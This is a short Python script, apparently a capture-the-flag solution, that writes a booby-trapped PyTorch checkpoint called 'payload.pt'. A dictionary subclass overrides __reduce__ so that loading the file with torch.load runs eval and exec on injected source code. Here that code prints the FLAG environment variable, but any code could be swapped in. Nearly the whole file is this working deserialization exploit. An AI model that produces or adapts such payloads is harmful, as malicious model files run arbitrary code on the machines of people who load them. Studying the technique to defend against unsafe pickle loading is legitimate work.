from typing import Callable
import inspect
import torch
import os 

class BadDict(dict):
    def __init__(self, inject_src: str, **kwargs):
        super().__init__(**kwargs)
        self._inject_src = inject_src
    def __reduce__(self):
        return eval, (f"exec('''{self._inject_src}''') or dict()",), None, None, iter(self.items())

def win():
    print(os.environ['FLAG'])

def patch_save_function(function_to_inject: Callable):
    f = open("payload.pt", 'wb')
    source = inspect.getsourcelines(function_to_inject)[0] # get source code
    source = source[1:] # drop function def line
    indent = len(source[0]) - len(source[0].lstrip()) # find indent of body
    source = [line[indent:] for line in source] # strip first indent
    inject_src = "\n".join(source) # make into single string
    dict_to_save = BadDict(inject_src)
    
    return torch.save(dict_to_save, f)

patch_save_function(win)